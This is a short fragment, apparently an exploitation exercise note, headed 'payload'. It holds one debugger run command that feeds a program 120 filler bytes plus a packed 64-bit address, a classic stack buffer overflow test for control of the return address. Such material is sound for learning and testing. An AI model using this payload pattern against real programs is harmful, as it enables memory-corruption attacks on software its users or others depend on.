payload
```
run < <(python2 -c  "from struct import pack;print 'A'*120+pack(\"<Q\", 0x414243444546)")
```